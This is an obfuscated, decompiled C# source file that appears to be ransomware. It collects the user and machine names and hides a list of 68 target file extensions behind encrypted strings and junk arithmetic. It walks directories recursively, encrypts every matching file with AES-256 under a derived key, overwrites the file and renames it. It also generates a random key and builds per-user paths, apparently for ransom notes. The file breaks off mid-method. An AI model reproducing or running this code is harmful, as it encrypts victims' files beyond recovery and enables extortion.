using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

internal class b
{
	private static string m_a = Environment.UserName;

	private static string m_b = Environment.MachineName.ToString();

	private static string m_c = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 48371), (int)((nint)Type.EmptyTypes.LongLength + 46935), (int)((nint)Type.EmptyTypes.LongLength + 146));

	public static void a()
	{
		string string_ = b(15);
		f(string_);
	}

	public unsafe static string b(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			stringBuilder.Append(_003CModule_003E.c(66577, (int)((nint)Type.EmptyTypes.LongLength + 67501), (int)((nint)Type.EmptyTypes.LongLength + 21))[random.Next(_003CModule_003E.c(sizeof(Guid) + 70087, sizeof(float) + 71034, (int)((nint)Type.EmptyTypes.LongLength + 55)).Length)]);
		}
		return stringBuilder.ToString();
	}

	public unsafe static byte[] c(byte[] byte_0, byte[] byte_1)
	{
		byte[] result = null;
		byte[] obj = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		_003CModule_003E.a = null;
		byte[] salt = obj;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			_003CModule_003E.o = -1592516334;
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
			_003CModule_003E.d = null;
			Rfc2898DeriveBytes rfc2898DeriveBytes2 = rfc2898DeriveBytes;
			rijndaelManaged.Key = rfc2898DeriveBytes2.GetBytes(rijndaelManaged.KeySize / 8);
			_003CModule_003E.h = -2111266222;
			rijndaelManaged.IV = rfc2898DeriveBytes2.GetBytes(rijndaelManaged.BlockSize / 8);
			global::a.b = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 45117), sizeof(ulong) + 46075, (int)((nint)Type.EmptyTypes.LongLength + 82));
			rijndaelManaged.Mode = CipherMode.CBC;
			_003CModule_003E.o = -942491469;
			ICryptoTransform transform = rijndaelManaged.CreateEncryptor();
			global::a.b = rijndaelManaged;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public unsafe static void d(string string_0, string string_1)
	{
		try
		{
			string[] array = new string[68];
			int num = default(int);
			nint intPtr = (((0xFFFFFFF | ((uint)num / 17u)) == 268435455) ? ((nint)Type.EmptyTypes.LongLength + 23760) : ((nint)Type.EmptyTypes.LongLength + -1991152871));
			int num3 = default(int);
			IntPtr intPtr2;
			int o = default(int);
			int num2 = default(int);
			if ((uint)num2 / 16039u == 2449857621u)
			{
				num3 = global::a.c;
				intPtr2 = ((num3 * 12966 - -131 != (int)((uint)num3 % 256u / 1972u >> 23)) ? ((nint)Type.EmptyTypes.LongLength + -884098835) : ((nint)Type.EmptyTypes.LongLength + 1457581078));
			}
			else
			{
				o = _003CModule_003E.o;
				intPtr2 = ((5009 + (o << 20) + 483840 == (int)((uint)(~(o * 1073741824)) >> 17)) ? ((nint)Type.EmptyTypes.LongLength + -1963321438) : ((nint)Type.EmptyTypes.LongLength + 213));
			}
			array[0] = _003CModule_003E.c((int)intPtr, 24763, (int)(nint)intPtr2);
			array[1] = _003CModule_003E.c(44666, sizeof(int) + 45550, (int)((nint)Type.EmptyTypes.LongLength + 219));
			int int_ = sizeof(double) + 21715;
			int num4 = 22774;
			array[2] = _003CModule_003E.c(int_, 22774, sizeof(Guid) + 95);
			array[3] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 8801), sizeof(uint) + 9559, sizeof(float) + 89);
			array[4] = _003CModule_003E.c((int)((((uint)((num3 << 16) + -2090598400 * num3) & 0xE8C7u) != 0) ? ((nint)Type.EmptyTypes.LongLength + -1280742505) : (sizeof(long) + 51678)), (int)((nint)Type.EmptyTypes.LongLength + 52693), (int)((nint)Type.EmptyTypes.LongLength + 117));
			nint num5 = (nint)Type.EmptyTypes.LongLength + 41225;
			nint num6 = (nint)Type.EmptyTypes.LongLength + 42189;
			int i = _003CModule_003E.i;
			array[5] = _003CModule_003E.c((int)num5, (int)num6, (int)((nint)Type.EmptyTypes.LongLength + 177));
			int num7 = default(int);
			nint num8;
			if ((((uint)num2 / 570u) ^ 0x2001DF0) == 0)
			{
				num7 = _003CModule_003E.l;
				num8 = -1751991961;
			}
			else
			{
				num8 = (nint)Type.EmptyTypes.LongLength + 32;
			}
			array[6] = _003CModule_003E.c(13256, 14389, (int)num8);
			array[7] = _003CModule_003E.c(sizeof(byte) + 66540, 67707, 238);
			array[8] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 51532), sizeof(int) + 52219, sizeof(short) + 133);
			int num9 = _003CModule_003E.m;
			int p = _003CModule_003E.p;
			int num10 = default(int);
			nint num11;
			if ((int)(33554432 * ((uint)p / 711941971u)) - int.MinValue == (int)((uint)p / 5u))
			{
				num10 = global::a.c;
				num11 = sizeof(ulong) + 1123732964;
			}
			else
			{
				num11 = (nint)Type.EmptyTypes.LongLength + 21839;
			}
			array[9] = _003CModule_003E.c(21231, (int)num11, (int)((((num * 111230976) | -9937) != -9937) ? ((nint)Type.EmptyTypes.LongLength + 720440157) : ((nint)Type.EmptyTypes.LongLength + 45)));
			int num12;
			nint num13;
			if ((-3461 & ~(num3 * ((num3 - -7573) & num3))) == 0)
			{
				num12 = sizeof(long) + 1964230553;
				num13 = num12;
			}
			else if ((((uint)num9 / 83u) | 0x3FFFFFF) != 67108863)
			{
				num12 = sizeof(long) + -1746278992;
				num13 = num12;
			}
			else
			{
				num13 = (nint)Type.EmptyTypes.LongLength + 63219;
			}
			array[10] = _003CModule_003E.c((int)num13, (int)((nint)Type.EmptyTypes.LongLength + 63846), sizeof(byte) + 84);
			array[11] = _003CModule_003E.c(53984, (((num9 * 26345472 - -5363) & num9) - -15126 != 2368 + num9) ? (sizeof(double) + 54670) : (((((num3 + num3 * 3) ^ -8657) & 1) == 1) ? (-1968804500) : (((int)((uint)(num2 * 3 + 29 * num2 + -6837) >> 5) - -4569 != num2) ? (sizeof(long) + -636894119) : (sizeof(Guid) + -1692008988))), sizeof(uint) + 198);
			array[12] = _003CModule_003E.c(56934, (((((uint)i / 1753u) & (uint)(i * 2 + 62 * i)) ^ 0xFFFFFA2Au) == 0) ? (sizeof(ushort) + -943959491) : (((0x21CFu ^ (uint)(num2 * 7 + num2)) != 0) ? (sizeof(uint) + 57961) : ((((num3 + num3 - -3545) | -2) == -1) ? 1332569406 : (-1085959746))), sizeof(ulong) + 33);
			bool flag = default(bool);
			_003CModule_003E.g = flag;
			nint num14 = (nint)Type.EmptyTypes.LongLength + 2621;
			int o2 = _003CModule_003E.o;
			nint intPtr3 = (((0x1260 ^ (o2 * 1117 + 931 * o2)) == 0) ? (sizeof(float) + 1951619264) : (((0x80 & (2342656 * num3)) != (0x80 & ((num3 * 20 + 12 * num3) * 32))) ? (sizeof(int) + -830710559) : ((nint)Type.EmptyTypes.LongLength + 3721)));
			int num15;
			nint num16;
			if ((1 & o) == (int)(((uint)(-921131914 + 1626296320 * o) >> 12) & 1))
			{
				num15 = 247;
				num16 = num15;
			}
			else if ((0xFFFFF800u & ((uint)num / 2097152u)) != 0)
			{
				num15 = sizeof(byte) + -1984861031;
				num16 = num15;
			}
			else
			{
				num16 = (nint)Type.EmptyTypes.LongLength + 1804492253;
			}
			array[13] = _003CModule_003E.c((int)num14, (int)intPtr3, (int)num16);
			nint num17 = (nint)Type.EmptyTypes.LongLength + 49528;
			int num18 = _003CModule_003E.m;
			array[14] = _003CModule_003E.c((int)num17, 49997, ((((16 * (num18 - 4313)) ^ ((num18 << 4) - 2308)) & 0x10) == 0) ? 44 : (-935261090));
			array[15] = _003CModule_003E.c(51579, 52085, (int)((nint)Type.EmptyTypes.LongLength + 160));
			nint num19 = (nint)Type.EmptyTypes.LongLength + 47327;
			int num20 = default(int);
			int num21 = default(int);
			int int_2;
			if (num20 * 205472 == 4785)
			{
				num21 = -1002593387;
				int_2 = -1002593387;
			}
			else
			{
				int_2 = sizeof(int) + 42;
			}
			array[16] = _003CModule_003E.c(45892, (int)num19, int_2);
			nint num22 = (nint)Type.EmptyTypes.LongLength + 49107;
			int p2 = _003CModule_003E.p;
			array[17] = _003CModule_003E.c(47683, (int)num22, (int)((int.MinValue + (int)((uint)p2 / 15u / 4u) != -95248 * p2 << 28) ? ((nint)Type.EmptyTypes.LongLength + 200) : ((nint)Type.EmptyTypes.LongLength + 2031769873)));
			nint num23 = (nint)Type.EmptyTypes.LongLength + 24178;
			int num24 = _003CModule_003E.k;
			array[18] = _003CModule_003E.c((int)num23, ((0xD4F & ((0xB2F | num24) - 7781)) == 0) ? (sizeof(uint) + 1804092126) : 25663, (int)((nint)Type.EmptyTypes.LongLength + 171));
			array[19] = _003CModule_003E.c(sizeof(double) + 59762, (int)((nint)Type.EmptyTypes.LongLength + 60132), ((-9069 | (num10 * 304218112 * 2086666240)) != -9069) ? (sizeof(Guid) + -2143677747) : (sizeof(float) + 81));
			array[20] = _003CModule_003E.c(38972, ((-4 | ((o2 * 2 + o2 * 2) ^ -6826)) == -2) ? (sizeof(float) + 39463) : (-885106073), (int)((nint)Type.EmptyTypes.LongLength + 17));
			int num25 = _003CModule_003E.k;
			array[21] = _003CModule_003E.c((int)((num25 + 15 * num25 + 9020 == -6408) ? ((nint)Type.EmptyTypes.LongLength + 825883416) : ((nint)Type.EmptyTypes.LongLength + 55087)), 56403, 46);
			array[22] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 40034), sizeof(double) + 40275, (int)((nint)Type.EmptyTypes.LongLength + 70));
			int num26;
			nint num27;
			if ((((uint)num25 / 2u) | 0x7FFFFFFF) != int.MaxValue)
			{
				num26 = sizeof(double) + -1668851279;
				num27 = num26;
			}
			else if (-num4 - 793 == (0x151A & num4) + num4)
			{
				if (-1729 + num10 == num10 - (int)((uint)(3 * num10 + num10 * 5) & ((uint)num10 / 16384u)))
				{
					num26 = sizeof(byte) + -2008747337;
					num27 = num26;
				}
				else
				{
					num26 = -1605128066;
					num27 = num26;
				}
			}
			else
			{
				num27 = (nint)Type.EmptyTypes.LongLength + 16140;
			}
			array[23] = _003CModule_003E.c(15662, (int)num27, (int)((nint)Type.EmptyTypes.LongLength + 225));
			nint num28 = (nint)Type.EmptyTypes.LongLength + 3563;
			nint num29;
			int num30 = default(int);
			int i2 = default(int);
			if ((((uint)num21 / 64u) ^ 0xCBC) != 1382460432)
			{
				num29 = (nint)Type.EmptyTypes.LongLength + 5168;
			}
			else if (((uint)((num4 * 524288) ^ (num4 << 19)) & 0x8BF00000u) != 0)
			{
				num29 = (nint)Type.EmptyTypes.LongLength + -2061200105;
			}
			else
			{
				num30 = _003CModule_003E.k;
				if ((((num30 & 0x24DA) - 8596) & 2) == (2 & ((num30 << 18) ^ num30)))
				{
					i2 = _003CModule_003E.i;
					num29 = (((uint)i2 % 242290926u / 1405u != 2166078342u) ? ((nint)Type.EmptyTypes.LongLength + 2020672465) : (((uint)(num4 + num4) / 7338u == 2235061062u) ? (sizeof(short) + -1716009444) : ((((num20 << 3) & 8) != ((3 * num20 + num20 * 5 - 4250) & 8)) ? ((nint)Type.EmptyTypes.LongLength + 778578065) : ((num9 * 385 + 127 * num9 - 9574 == -6069) ? ((nint)Type.EmptyTypes.LongLength + 1986138425) : ((nint)Type.EmptyTypes.LongLength + -1788858124)))));
				}
				else
				{
					num29 = 1022937303;
				}
			}
			int num31 = default(int);
			nint num33;
			if (((((uint)num2 % 10828902u) ^ 0x1E86) | 0xFFFFFF) != 16777215)
			{
				num31 = _003CModule_003E.l;
				int num32;
				if ((((uint)num31 / 134217728u) ^ 0x10A3u) != 0)
				{
					num32 = -1970122181;
					num33 = num32;
				}
				else
				{
					num32 = sizeof(short) + 499127020;
					num33 = num32;
				}
			}
			else
			{
				num33 = (nint)Type.EmptyTypes.LongLength + 42;
			}
			array[24] = _003CModule_003E.c((int)num28, (int)num29, (int)num33);
			array[25] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 38039), (int)((nint)Type.EmptyTypes.LongLength + 38247), sizeof(Guid) + 107);
			array[26] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 14593), (((1073741824 * num7 - 7402) & 0x12B0) != 528) ? (-1739199877) : (sizeof(uint) + 14756), (int)((nint)Type.EmptyTypes.LongLength + 80));
			int num34 = _003CModule_003E.l;
			array[27] = _003CModule_003E.c(sizeof(Guid) + 50933, (int)(((num25 & -877461504) != (num25 & -877461504)) ? (sizeof(ushort) + -1262957044) : ((2 * (-9743 + 8 * num18 + num18 * 8) - 2330 == ~(num18 * 1108608)) ? ((nint)Type.EmptyTypes.LongLength + 2088141787) : ((nint)Type.EmptyTypes.LongLength + 52167))), (int)((9 * num21 + 28104 + num21 * 7 != (int)((uint)num21 % 176u >> 27)) ? (sizeof(int) + 79) : (((((uint)(-(num25 * -1358080)) >> 8) & 1) != (uint)(1 & num25)) ? ((nint)Type.EmptyTypes.LongLength + 2025437481) : 1616226710)));
			array[28] = _003CModule_003E.c(1799, (int)((nint)Type.EmptyTypes.LongLength + 2920), (int)((nint)Type.EmptyTypes.LongLength + 112));
			array[29] = _003CModule_003E.c(72082, sizeof(ushort) + 72140, sizeof(float) + 172);
			array[30] = _003CModule_003E.c(sizeof(byte) + 36779, 37841, sizeof(float) + -4);
			array[31] = _003CModule_003E.c((~((i2 * 262144) | (num4 << 6)) == 64 * -num4) ? 1725673562 : 23099, (int)((nint)Type.EmptyTypes.LongLength + 24677), sizeof(ulong) + 103);
			array[32] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 9843), (int)((nint)Type.EmptyTypes.LongLength + 11456), sizeof(ushort) + 25);
			array[33] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 70176), sizeof(double) + 71936, 38);
			array[34] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 45027), sizeof(long) + 45846, 158);
			array[35] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 16640), 18590, (int)((nint)Type.EmptyTypes.LongLength + 8));
			int num35 = ((num30 << 5) - -1097453867 << 1) - 28008;
			int o3 = _003CModule_003E.o;
			array[36] = _003CModule_003E.c((int)((num35 == o3 * 29601792) ? (sizeof(float) + 822536993) : ((12966 * num4 - -131 == (int)((uint)num4 % 256u / 1972u >> 23)) ? ((nint)Type.EmptyTypes.LongLength + -545425992) : 46061)), (int)(((((uint)num34 >> 14) | 0xFFFFDB1Bu) - 69472 == (uint)num34 >> 14) ? 428344536 : ((nint)Type.EmptyTypes.LongLength + 45934)), (int)((nint)Type.EmptyTypes.LongLength + 77));
			int num36 = 15650;
			array[37] = _003CModule_003E.c(15774, 15650, (int)((nint)Type.EmptyTypes.LongLength + 27));
			array[38] = _003CModule_003E.c(11693, 11512, (int)((nint)Type.EmptyTypes.LongLength + 69));
			int int_3 = ((((true ? 1u : 0u) & (uint)(num7 * ~(num7 | -523283))) != 0 && (~num7 & 0x40) != 64) ? 1672369565 : ((((uint)(279194752 * num18) ^ 0x1C55u) != 0) ? (sizeof(uint) + 16645) : (((0x400936 ^ ((uint)(num31 & 0x1F3C) / 2097152u)) == 0) ? (-1877149128) : (sizeof(uint) + 2041853473))));
			nint num38;
			if (num3 * 4194304 - 4165 == 4483)
			{
				if ((0x10000 & num20) == 0 || (0x10000 & num20) == 65536)
				{
					int num37;
					if (-784859136 * num3 == -6467)
					{
						num37 = sizeof(int) + 1927553003;
						num38 = num37;
					}
					else
					{
						num37 = 1044404545;
						num38 = num37;
					}
				}
				else
				{
					num38 = (nint)Type.EmptyTypes.LongLength + -1876226853;
				}
			}
			else
			{
				num38 = (nint)Type.EmptyTypes.LongLength + 18559;
			}
			array[39] = _003CModule_003E.c(int_3, (int)num38, (int)(((3 & (num24 + 3 * num24)) == 0) ? ((nint)Type.EmptyTypes.LongLength + 62) : (-1294047847)));
			nint num41;
			if (((uint)(num4 ^ (-1347788968 + (0x58000 & num4))) & 0x10000u) != 0)
			{
				int num39 = default(int);
				int num40;
				if ((((uint)num39 / 256u) ^ 0x20001210) == 0)
				{
					num40 = sizeof(Guid) + -97492853;
					num41 = num40;
				}
				else
				{
					num40 = sizeof(int) + 1716393780;
					num41 = num40;
				}
			}
			else
			{
				int num39 = _003CModule_003E.o;
				num41 = ((1241513984 * num39 - -1538890638 != 1808900345) ? 88 : ((nint)Type.EmptyTypes.LongLength + -1484667229));
			}
			array[40] = _003CModule_003E.c(2276, 4359, (int)num41);
			array[41] = _003CModule_003E.c(61361, (int)(((int)((uint)i >> 16) < 0) ? (sizeof(long) + -1088346947) : ((nint)Type.EmptyTypes.LongLength + 63473)), (int)((nint)Type.EmptyTypes.LongLength + 245));
			array[42] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 44225), 44280, (int)((nint)Type.EmptyTypes.LongLength + 108));
			array[43] = _003CModule_003E.c(16279, (int)((nint)Type.EmptyTypes.LongLength + 18045), (int)((nint)Type.EmptyTypes.LongLength + 14));
			array[44] = _003CModule_003E.c((int)(((int)((uint)num9 / 3417503u) - -937024654 < 0) ? ((nint)Type.EmptyTypes.LongLength + 2023704055) : ((nint)Type.EmptyTypes.LongLength + 14199)), 16008, sizeof(Guid) + 54);
			array[45] = _003CModule_003E.c((int)(((0x201BAEu ^ ((uint)o / 1583214076u + (uint)o % 343u + (uint)o % 343u)) != 0) ? ((nint)Type.EmptyTypes.LongLength + 22971) : ((nint)Type.EmptyTypes.LongLength + 2004850123)), sizeof(byte) + 23142, (int)((nint)Type.EmptyTypes.LongLength + 23));
			array[46] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 57240), 58893, (int)((nint)Type.EmptyTypes.LongLength + 186));
			int j = _003CModule_003E.j;
			array[47] = _003CModule_003E.c((j * 805306368 != 718454987) ? (sizeof(byte) + 40209) : (sizeof(float) + 1915335171), sizeof(byte) + 39791, (int)((nint)Type.EmptyTypes.LongLength + 161));
			array[48] = _003CModule_003E.c((int)(((0x3FFFF | ((int)((uint)num34 >> 18) - -8544)) == 262143) ? ((nint)Type.EmptyTypes.LongLength + 63442) : ((nint)Type.EmptyTypes.LongLength + -1350389500)), (int)(((((uint)num9 / 67617u) | 0x3FD6FFFF) == 1071054847) ? 65677 : (((0x8002F0 ^ (((uint)num2 / 1073741824u) | ((uint)num20 % 5886643u))) == 0) ? ((nint)Type.EmptyTypes.LongLength + 1998704690) : ((nint)Type.EmptyTypes.LongLength + 1809653215))), 183);
			array[49] = _003CModule_003E.c((int)((~(2 * (num21 * 749731840 + -1397)) == ((num21 << 17) ^ 0x1A09)) ? ((nint)Type.EmptyTypes.LongLength + 1007787829) : 7490), sizeof(ulong) + 7218, 146);
			array[50] = _003CModule_003E.c((int)((((num36 ^ (num36 | (num36 * 56 + num36 * 200)) ^ 0x108) & 1) == 0) ? 37856 : ((nint)Type.EmptyTypes.LongLength + 1603734414)), (int)((nint)Type.EmptyTypes.LongLength + 38129), 197);
			array[51] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 42440), (int)((25872 + -num4 * 16 == -num4 * 11 + 5 * -num4) ? (-1386986959) : ((num18 * 16777216 != 1084353598) ? ((nint)Type.EmptyTypes.LongLength + 44790) : ((17620992 * num31 + 100256 != 4 * (0x690 & (num31 << 5))) ? ((nint)Type.EmptyTypes.LongLength + 1694481563) : (-1203130900)))), (int)((nint)Type.EmptyTypes.LongLength + 253));
			array[52] = _003CModule_003E.c(sizeof(ushort) + 37637, (int)((nint)Type.EmptyTypes.LongLength + 37344), (int)((nint)Type.EmptyTypes.LongLength + 167));
			array[53] = _003CModule_003E.c(16362, 18718, 7);
			nint num42;
			int num43 = default(int);
			if ((0xFFFFECB4u & (4294958788u + ((uint)num20 >> 26))) != 0)
			{
				if ((uint)p2 / 32u == 1796913459)
				{
					num42 = -1888521640;
				}
				else if ((((uint)o2 % 22u / 647u) ^ 0x4000039Eu) != 0)
				{
					num42 = (nint)Type.EmptyTypes.LongLength + 17068;
				}
				else
				{
					num43 = global::a.c;
					num42 = -1486675218;
				}
			}
			else
			{
				num42 = -925281834;
			}
			array[54] = _003CModule_003E.c((int)num42, (int)((256 * (num34 | 0x27FF) - -286334976 != ~(-(num34 << 25))) ? ((nint)Type.EmptyTypes.LongLength + 17481) : (((((uint)num20 / 31409u) & 0x40000) == (uint)((32768 * (num20 * 8 + 8 * num20)) & 0x40000)) ? (sizeof(Guid) + -517537768) : ((((num4 + 9078) & 1) == (num4 & 1)) ? ((nint)Type.EmptyTypes.LongLength + 1289655760) : ((nint)Type.EmptyTypes.LongLength + 1571782031)))), (int)((nint)Type.EmptyTypes.LongLength + 113));
			array[55] = _003CModule_003E.c(sizeof(float) + 25083, 25497, sizeof(Guid) + -11);
			nint num44;
			if (num9 * 4 + -63008 == 32 * ((int)((uint)num9 / 8u) + -9144))
			{
				int o4 = _003CModule_003E.o;
				num44 = ((o4 - 3386368 == (o4 & 0xCF5)) ? ((nint)Type.EmptyTypes.LongLength + -1258285692) : ((nint)Type.EmptyTypes.LongLength + 1963304847));
			}
			else
			{
				num44 = (nint)Type.EmptyTypes.LongLength + 241;
			}
			array[56] = _003CModule_003E.c(6920, 7339, (int)num44);
			_003CModule_003E.i = 1614826868;
			nint num45;
			if ((0xB5233CFAu ^ (uint)((0x1376 & num2) - 6944)) != 0)
			{
				num45 = 50606;
			}
			else
			{
				int num46 = _003CModule_003E.m;
				num45 = (((uint)num46 / 16u != 2329935330u) ? (sizeof(Guid) + 1861187693) : ((nint)Type.EmptyTypes.LongLength + 985229126));
			}
			nint num47 = (nint)Type.EmptyTypes.LongLength + 49910;
			nint num48;
			if ((((uint)(238 * o + 18 * o) / 268435456u) ^ 0x20001D4D) == 0)
			{
				num48 = (nint)Type.EmptyTypes.LongLength + 1844317376;
			}
			else
			{
				int num49 = _003CModule_003E.m;
				num48 = (((7 & ~(num49 * 6 + 2 * num49)) != 7) ? ((nint)Type.EmptyTypes.LongLength + -910511388) : (((0x1000 & (num43 ^ 0xC20)) != (0x1000 & ((0x195B & num43) + (int)((uint)num43 % 5u)))) ? (sizeof(int) + 947900046) : ((nint)Type.EmptyTypes.LongLength + 5)));
			}
			array[57] = _003CModule_003E.c((int)num45, (int)num47, (int)num48);
			array[58] = _003CModule_003E.c(49102, (int)((nint)Type.EmptyTypes.LongLength + 50619), ((0x3A000000 & ((uint)num21 / 632u)) == (0x3A000000 & ((uint)num21 / 214225u >> 2))) ? 168 : (-1168337015));
			nint num50 = (nint)Type.EmptyTypes.LongLength + 15139;
			nint num51 = (nint)Type.EmptyTypes.LongLength + 15689;
			int h = _003CModule_003E.h;
			array[59] = _003CModule_003E.c((int)num50, (int)num51, (int)((-h - -1017 == h - -7524) ? ((nint)Type.EmptyTypes.LongLength + 830439303) : (sizeof(ushort) + 82)));
			nint num52 = (nint)Type.EmptyTypes.LongLength + 33372;
			int j2 = _003CModule_003E.j;
			int num53 = default(int);
			nint num54;
			if (1935147008 + 131072 * ((0x259A | j2) << 4) == -335544320 * p2)
			{
				num53 = -1054253607;
				num54 = -1054253607;
			}
			else
			{
				num54 = (nint)Type.EmptyTypes.LongLength + 33619;
			}
			array[60] = _003CModule_003E.c((int)num52, (int)num54, (int)((((num31 * 84224 + 3134) & 0x38) != 56) ? ((nint)Type.EmptyTypes.LongLength + -1315027071) : ((nint)Type.EmptyTypes.LongLength + 194)));
			array[61] = _003CModule_003E.c(52750, (int)(((0x16FF | (o3 & 0x1FE000)) - -432603136 != o3) ? ((nint)Type.EmptyTypes.LongLength + 55274) : (sizeof(float) + 1774986124)), sizeof(byte) + 51);
			int num55 = _003CModule_003E.m;
			array[62] = _003CModule_003E.c((int)((-(num55 * -268435456) == -9119) ? ((nint)Type.EmptyTypes.LongLength + -791674665) : (sizeof(short) + 33515)), sizeof(Guid) + 34080, (int)((nint)Type.EmptyTypes.LongLength + 159));
			array[63] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 35100), (int)(((1 & -j2) != ((5456 + j2) & 1)) ? (sizeof(ulong) + -1094763922) : ((nint)Type.EmptyTypes.LongLength + 36582)), (int)((((9078 + num4) & 1) != (num4 & 1)) ? ((nint)Type.EmptyTypes.LongLength + 2033617001) : ((nint)Type.EmptyTypes.LongLength + 154)));
			array[64] = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 66907), (int)((nint)Type.EmptyTypes.LongLength + 66056), sizeof(float) + 167);
			array[65] = _003CModule_003E.c(sizeof(ulong) + 18055, (int)((nint)Type.EmptyTypes.LongLength + 20759), 112);
			int num57;
			nint num58;
			if (274368 + (0x1700 & num31) != (num31 & 0x12BB))
			{
				int num56 = 55605;
				num57 = num56;
				num58 = num57;
			}
			else if (~(~(num * 2621440)) != 524288 * (num + 1853))
			{
				num58 = (((0x40000000 & (1073741824 * p2)) == ((-1073741824 * p2) & 0x40000000)) ? (-1706127806) : ((nint)Type.EmptyTypes.LongLength + 668985527));
			}
			else if (((2 * num53 + 14 * num53) | -10) == -10)
			{
				if ((-(num25 * 33988608) ^ 0x47DCF275) == 0)
				{
					num57 = sizeof(uint) + -2110377276;
					num58 = num57;
				}
				else
				{
					num57 = 1102619425;
					num58 = num57;
				}
			}
			else
			{
				num57 = 1617819175;
				num58 = num57;
			}
			array[66] = _003CModule_003E.c((int)num58, (int)((nint)Type.EmptyTypes.LongLength + 56844), (int)((nint)Type.EmptyTypes.LongLength + 172));
			int h2 = _003CModule_003E.h;
			array[67] = _003CModule_003E.c(27079, 27845, ((int)((uint)h2 >> 7) - -402653184 == 128 * (h2 & 0x194B)) ? 1221646887 : (sizeof(ushort) + 60));
			string[] source = array;
			string[] files = Directory.GetFiles(string_0);
			string[] directories = Directory.GetDirectories(string_0);
			for (num2 = 0; num2 < files.Length; num2++)
			{
				string? extension = Path.GetExtension(files[num2]);
				k.c = 1952428595;
				string value = extension;
				if (source.Contains(value))
				{
					e(files[num2], string_1);
				}
			}
			num = 0;
			while (flag = num < directories.Length)
			{
				d(directories[num], string_1);
				int num59 = num;
				_003CModule_003E.a = null;
				num = num59 + 1;
			}
		}
		catch (Exception)
		{
		}
	}

	public unsafe static void e(string string_0, string string_1)
	{
		byte[] byte_ = File.ReadAllBytes(string_0);
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = c(byte_, bytes);
		int int_ = 8175;
		int p = _003CModule_003E.p;
		string text = _003CModule_003E.c(int_, (int)((((uint)(-(p + p * 3)) ^ 0x1456u) != 0) ? 9864 : ((nint)Type.EmptyTypes.LongLength + -1533363281)), (int)((nint)Type.EmptyTypes.LongLength + 145));
		string text2 = text + global::b.m_a + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 23271), sizeof(ushort) + 23529, (int)((nint)Type.EmptyTypes.LongLength + 30));
		string path = global::b.m_c + text2;
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		File.WriteAllBytes(string_0, bytes2);
		File.Move(string_0, string_0 + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 10712), (int)((~(p << 9) != (p ^ 0x11DB) * 512) ? 11493 : ((-(p * 17 + p * 15) == 1464187571) ? 1173638568 : ((((((uint)(~p) % 2097152u / 256971u) ^ 0x816) & 0xFFFF8000u) == 0) ? ((nint)Type.EmptyTypes.LongLength + 1918360874) : ((nint)Type.EmptyTypes.LongLength + 792246216)))), sizeof(double) + 37));
	}

	public unsafe static void f(string string_0)
	{
		int p = _003CModule_003E.p;
		string text = _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 16345), (int)((nint)Type.EmptyTypes.LongLength + 18223), 37);
		string string_ = global::b.m_c + text + global::b.m_a + _003CModule_003E.c(7655, (int)((nint)Type.EmptyTypes.LongLength + 10524), (int)((nint)Type.EmptyTypes.LongLength + 120));
		_003CModule_003E.l = 1047817133;
		string string_2 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 47029), ((-870 | (6636544 * p)) != -870) ? (sizeof(Guid) + 1400342315) : (sizeof(double) + 45893), sizeof(float) + 95);
		string text2 = global::b.m_c;
		string text3 = global::b.m_a;
		int num = _003CModule_003E.m;
		int num2;
		nint num3;
		if ((num << 12) - int.MinValue == 4096 * num)
		{
			num2 = -1939520348;
			num3 = num2;
		}
		else if ((-3630 | (-1073741824 * num * (num << 14))) == -3630)
		{
			num2 = sizeof(double) + 43951;
			num3 = num2;
		}
		else
		{
			num3 = (nint)Type.EmptyTypes.LongLength + -940734059;
		}
		string string_3 = text2 + text + text3 + _003CModule_003E.c((int)num3, (int)(((1 & -num) == (int)(((uint)(num * 588 + num * 436) >> 10) & 1)) ? ((nint)Type.EmptyTypes.LongLength + 42850) : ((-num - 8821 != (int)((uint)(num << 26) >> 26)) ? ((nint)Type.EmptyTypes.LongLength + -2032556447) : ((int.MinValue + p * 1073741824 == (p - -1052231380) * 1073741824) ? ((nint)Type.EmptyTypes.LongLength + -2036073286) : (sizeof(byte) + -1732536375)))), (int)(((uint)(num << 8) / 44135206u == 2927616331u) ? ((nint)Type.EmptyTypes.LongLength + -1809670815) : ((nint)Type.EmptyTypes.LongLength + 67)));
		string string_4 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c(((((uint)p % 1176201765u) ^ 0x800017E7u) == 0) ? (-1911321715) : (sizeof(uint) + 5779), 4637, sizeof(double) + 161);
